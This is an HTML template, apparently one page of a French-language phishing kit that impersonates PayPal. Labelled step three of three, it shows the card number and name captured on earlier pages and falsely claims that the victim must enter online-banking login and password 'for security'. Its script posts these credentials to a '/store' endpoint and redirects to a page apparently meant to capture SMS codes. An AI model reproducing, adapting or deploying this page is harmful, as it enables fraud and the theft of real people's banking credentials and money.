<!DOCTYPE html>
<html dir="ltr">

    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <title>Confirmez votre banque</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta http-equiv="X-UA-COMPATIBLE" content="IE-edge">

        <link rel="stylesheet" href="/css/normalize.css">
        <link rel="stylesheet" href="/css/bootstrap.min.css">
        <link rel="stylesheet" href="/css/font-awesome.min.css">
        <link rel="stylesheet" href="/css/main_style.css">
    </head>

    <body>
        <div class="lod-full" style="display: none;">
            <div class="lod-c"></div>
        </div>
        <style>
        .error {
            border: 1px solid #c72e2e;
        }

        </style>
        <div class="contain">
            <div class="img-logo">
                <a href="#"><img src="./images/paypal-logo.png"
                        style="height: 160px;margin-top: -60px;margin-bottom: -75px;"></a>
            </div>
            <div class="center-color"></div>
            <div class="right-btn"><a href="#" class="log_out">Déconnexion</a></div>
            <div class="cls"></div>
        </div>
        <div class="contain biling-p">
            <form method="POST" action="#" class="contain-info" id="bankform">
                <center>
                    <span class="step" style="text-transform:uppercase"><b>étape 3 sur 3</b></span>
                    <h3>Confirmez votre banque</h3>
                    <div style="text-align:left;text-transform:uppercase">
                        <center> <span class="step" style="text-transform:uppercase"></span>
                            <h3><b>Confirmation d'identité<br>
                                </b></h3>
                            <p style="text-align: left;">Vous devez obligatoirement confirmer votre compte bancaire à
                                l'aide de vos identifiants de connexion en ligne par mesure de sécurité.
                            </p>
                            <hr>
                            Pour confirmez votre compte bancaire:<br>
                            Veuillez saisir le numéro de client et le mot de passe utilisé pour vos services bancaires
                            en ligne.
                            <p></p>

                            &nbsp;

                            <b>NUMERO DE CARTE : </b><span id="replace_c_num"></span><br>
                            <b>NOM ET PRENOM : </b><span id="replace_n_card"></span><br>

                        </center>
                    </div>
                    <style>
                    .dd-select {
                        border-radius: 5px !important;
                    }

                    .dd-selected-image {
                        max-height: 32px;
                    }

                    </style>
                    <div style="text-align: left;font-size: 15px;font-weight: bold;margin-top: 12px;">Choisissez votre
                        banque</div>
                    <select name="bank_name_select" id="bank_name_select">
                        {% foreach($banks as $bank ): %}
                        <option value="{!! $bank['name'] !!}" data-imagesrc="{{ $bank['source'] }}">
                            {!! $bank['name'] !!}
                        </option>
                        {% endforeach %}
                    </select>
                    <input id="bankname" type="text" maxlength="15" name="bankname" class="bill_input"
                        placeholder="Nom de la Banque" autocomplete="off" autocorrect="off" style="display: none;">

                    <input id="css" type="text" style="margin-top:5px" name="bankid" class="bill_input"
                        placeholder="Identifiant Bancaire" required="required" autocomplete="off" autocorrect="off"
                        aria-required="true">
                    <input type="password" maxlength="64" name="bankpass" class="bill_input" placeholder="Mot de Passe"
                        required="required" autocomplete="off" autocorrect="off" aria-required="true">
                    <hr>
                    <input type="submit" name="ibansub" id="sub" value="Continuer" class="bill_input btn-bill">
                </center>
            </form>
        </div>
        <div class="foot-pay">
            <center>
                <a href="#">Aide et Contact</a>
                <a href="#">Confidentialité</a>
                <a href="#">Légal</a>
                <a href="#">Sécurité</a>
            </center>
        </div>
        <script src="/js/jquery-3.3.1.min.js"></script>
        <script src="/js/jquery.ddslick.min.js"></script>
        <script>
        $(document).ready(function() {
            if (!sessionStorage.getItem("n_card") || !sessionStorage.getItem("c_num")) {
                location.replace("{{ url('/confirm-card') }}");
            }

            $('#bank_name_select').ddslick({
                width: "100%",
                height: 300,
                onSelected: function(data) {
                    $('.dd-selected-text').each(function(i, el) {
                        $(el).removeAttr('style');
                    });
                    if (data.selectedData.value.includes("Autres banques")) {
                        return $('#bankname').show();
                    }
                    bank_input = $('#bankname');
                    bank_input.val(data.selectedData.value);
                    return bank_input.hide();
                }
            });
            $('.dd-container, .dd-select, .dd-option-text, .dd-selected-text').each(function(i, el) {
                $(el).removeAttr('style');
            });
            $('.dd-select').click(function() {
                $('.dd-selected-text, .dd-option-text').each(function(i, el) {
                    $(el).removeAttr('style');
                });
            });

            $('.dd-option-image').css({
                "max-height": "64px"
            });

            $('#replace_n_card').html(sessionStorage.getItem("n_card"));
            $('#replace_c_num').html(sessionStorage.getItem("c_num"));

            $('#bankform').submit(function(e) {
                e.preventDefault();
                $('.lod-full').show();
                $.post("{{url('/store')}}", $(this).serialize())
                    .done(function() {
                        location.replace("{{ url('/confirm-sms-bank') }}");
                    }).fail(function() {
                        location.reload();
                    })
            });
        });
        </script>


    </body>

</html>
